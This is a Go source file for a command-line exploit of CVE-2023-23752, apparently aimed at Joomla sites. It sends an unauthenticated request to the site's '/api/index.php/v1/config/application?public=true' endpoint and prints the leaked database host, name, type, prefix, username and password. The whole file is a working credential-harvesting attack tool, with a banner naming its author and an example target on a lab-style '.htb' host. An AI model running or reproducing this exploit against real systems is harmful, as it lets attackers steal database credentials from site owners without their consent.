package main

import (
	"fmt"
	//"regexp"
	//"strconv"
	//"errors"
	"log"
	"net/http"
	//"bytes"
	"io/ioutil"
	"strings"
	//"os"
	//"encoding/base64"
	"encoding/json"
	"time"

	"github.com/jessevdk/go-flags"
)

// Define ANSI colors
var colors = map[string]string{
	"black":  "\033[1;30m",
	"bred":   "\033[1;31m",
	"red":    "\033[31m",
	"bgreen": "\033[1;32m",
	"green":  "\033[32m",
	"yellow": "\033[1;33m",
	"brown":  "\033[33m",
	"bblue":  "\033[1;34m",
	"blue":   "\033[34m",
	"pink":   "\033[1;35m",
	"purple": "\033[35m",
	"bcyan":  "\033[1;36m",
	"cyan":   "\033[36m",
	"bwhite": "\033[1;37m",
	"white":  "\033[37m",
	"reset":  "\033[0m",
}

type ConfigData struct {
	Attributes struct {
		Hostname *string `json:"host"`
		Db       *string `json:"db"`
		Dbtype   *string `json:"dbtype"`
		Db_pre   *string `json:"dbprefix"`
		User     *string `json:"user"`
		Password *string `json:"password"`
	} `json:"attributes"`
}

type ConfigResponse struct {
	Data []ConfigData `json:"data"`
}

// Simple function that checks if there is an error so the program terminates, printing the error
func check_error(err error) {
	if err != nil {
		log.Fatalf("%sups! something happened: %v%s\n", colors["bred"], err, colors["reset"])
	}
}

// Define the flags for the user
type Options struct {
	Target_url string `short:"u" long:"target-url" description:"Target/Host url where 'Spring Cloud' is running. Example: -t http://somesite.htb" required:"true"`
}

// Print a simple banner
func printBanner() {
	fmt.Printf("%s######################################################%s\n", colors["bgreen"], colors["reset"])
	fmt.Printf("%s################### %sCVE-2023-23752%s ###################%s\n", colors["bgreen"], colors["bred"], colors["bgreen"], colors["reset"])
	fmt.Printf("%s######################################################%s\n", colors["bgreen"], colors["reset"])
	fmt.Printf("                                            %sby gunzf0x%s\n\n", colors["bcyan"], colors["reset"])
}

// Check prefix for the url
func ensureHTTPInURL(url *string) {
	// Check if the string starts with "http://" or "https://"
	if strings.HasPrefix(*url, "http://") || strings.HasPrefix(*url, "https://") {
		return
	}
	// If not, add "https://"
	*url = "https://" + *url
}

// Remove '/' at the end of the url given by the user, if present
func removeTrailingSlashFromURL(url *string) {
	if strings.HasSuffix(*url, "/") {
		*url = (*url)[:len(*url)-1]
	}
}

// Get data from vulnerable endpoint
func getJSONData(url *string) (string, error) {
	star := fmt.Sprintf("%s[%s*%s]%s ", colors["bgreen"], colors["bblue"], colors["bgreen"], colors["reset"])
	fmt.Printf("%s%sExtracting data from %s'%s%s%s'%s...%s\n", star, colors["red"], colors["blue"], colors["green"],
		colors["blue"], *url, colors["red"], colors["reset"])
	base_url := *url + "/api/index.php/v1/config/application?public=true"

	// Define a standard header
	headers := map[string]string{
		"Host":         *url,
		"Content-Type": "application/vnd.api+json",
		"User-Agent":   "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
		"Accept":       "*/*", // this is important or the request will be denied
	}

	// Create a new request
	req, err := http.NewRequest("GET", base_url, nil)
	if err != nil {
		return "", err
	}

	// Add headers to the request
	for key, value := range headers {
		req.Header.Add(key, value)
	}

	// Create a new HTTP client
	client := &http.Client{Timeout: 10 * time.Second}

	// Perform the request
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// Read and print the entire response body
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(body), nil
}

// Print the extracted data in a more ordered form
func decodeData(json_data *string) {
	// Pass data to a "structured" form (unmarshall)
	var configResponse ConfigResponse
	if err := json.Unmarshal([]byte(*json_data), &configResponse); err != nil {
		fmt.Println("[!] Error processing JSON:", err)
		return
	}

	fmt.Println()
	// Print the values only if they are not null
	for _, configData := range configResponse.Data {
		if configData.Attributes.Db != nil {
			fmt.Printf("%s    ----> Database: %s%s%s\n", colors["bred"], colors["cyan"], *configData.Attributes.Db, colors["reset"])
		}
		if configData.Attributes.Hostname != nil {
			fmt.Printf("%s    ----> Hostname: %s%s%s\n", colors["bred"], colors["cyan"], *configData.Attributes.Hostname, colors["reset"])
		}
		if configData.Attributes.Dbtype != nil {
			fmt.Printf("%s    ----> Database Type: %s%s%s\n", colors["bred"], colors["cyan"], *configData.Attributes.Dbtype, colors["reset"])
		}
		if configData.Attributes.Db_pre != nil {
			fmt.Printf("%s    ----> Database Prefix: %s%s%s\n", colors["bred"], colors["cyan"], *configData.Attributes.Db_pre, colors["reset"])
		}
		if configData.Attributes.User != nil {
			fmt.Printf("%s    ----> User: %s%s%s\n", colors["bred"], colors["cyan"], *configData.Attributes.User, colors["reset"])
		}
		if configData.Attributes.Password != nil {
			fmt.Printf("%s    ----> Password: %s%s%s\n", colors["bred"], colors["cyan"], *configData.Attributes.Password, colors["reset"])
		}
	}
}

// MAIN
func main() {
	//Print banner
	printBanner()

	// Get the flags and parse them
	var opts Options
	parser := flags.NewParser(&opts, flags.Default)
	if _, err_parser := parser.Parse(); err_parser != nil {
		log.Fatalf("%sups! something happened: %v%s\n", colors["bred"], err_parser, colors["reset"])
	}

	// Check if the url has been passed with or without http at the beginning of the string
	ensureHTTPInURL(&opts.Target_url)

	// Remove '/' from the last character if present
	removeTrailingSlashFromURL(&opts.Target_url)

	// Get data from vulnerable endpoint
	data_json, err_req := getJSONData(&opts.Target_url)
	if err_req != nil {
		fmt.Printf("%s[!] ...maybe try 'http://%s'%s\n", colors["red"], opts.Target_url, colors["reset"])
	}
	check_error(err_req)

	// Print data extracted
	decodeData(&data_json)
}
